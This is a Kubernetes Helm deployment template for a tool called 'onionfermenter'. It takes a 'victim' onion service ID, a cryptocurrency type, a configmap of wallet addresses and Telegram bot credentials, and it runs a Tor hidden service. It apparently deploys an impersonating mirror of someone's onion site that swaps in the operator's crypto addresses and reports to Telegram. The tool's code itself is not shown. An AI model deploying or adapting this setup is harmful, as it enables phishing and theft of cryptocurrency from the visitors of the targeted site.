apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "onionfermenter.fullname" . }}
spec:
  replicas: {{ .Values.replicaCount }}
  selector:
    matchLabels:
      app: onionfermenter
  template:
    metadata:
      labels:
        app: onionfermenter
    spec:
      containers:
        - name: {{ .Chart.Name }}
          image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"
          imagePullPolicy: {{ .Values.image.pullPolicy }}
          env:
            - name: VICTIM_ONION_ID
              value: {{ .Values.victimOnionId }}
            - name: CURRENCY_TYPE
              value: {{ .Values.currencyType | default "BTC" }}
            - name: TELEGRAM_BOT_TOKEN
              value: {{ .Values.telegramBotToken | default "" }}
            - name: TELEGRAM_CHAT_ID
              value: {{ .Values.telegramChatId | default "" }}
          volumeMounts:
            - mountPath: /var/lib/tor/hidden_service
              name: hidden-service-volume
            - name: config-volume
              mountPath: /onionfermenter/{{ .Values.currencyType | default "BTC" }}-ADDRESSES.txt
              subPath: {{ .Values.currencyType | default "BTC" }}-ADDRESSES.txt
          livenessProbe:
            exec:
              command:
                - /bin/sh
                - -c
                - "curl -x socks5h://localhost:9050 http://`cat /var/lib/tor/hidden_service/hostname`"
            initialDelaySeconds: 30
            periodSeconds: 300
            failureThreshold: 5
            timeoutSeconds: 60
          readinessProbe:
            exec:
              command:
                - /bin/sh
                - -c
                - "curl -x socks5h://localhost:9050 http://`cat /var/lib/tor/hidden_service/hostname`"
            initialDelaySeconds: 30
            periodSeconds: 300
            failureThreshold: 5
            timeoutSeconds: 60
      initContainers:
        - name: init-myservice
          image: busybox:1.28
          command: ['sh', '-c', "chown -R 100:nogroup /var/lib/tor/hidden_service && chmod 700 /var/lib/tor/hidden_service"]
          volumeMounts:
            - mountPath: /var/lib/tor/hidden_service
              name: hidden-service-volume
      volumes:
        - name: hidden-service-volume
          emptyDir:
            sizeLimit: 10Mi
        - name: config-volume
          configMap:
            name: crypto-addresses
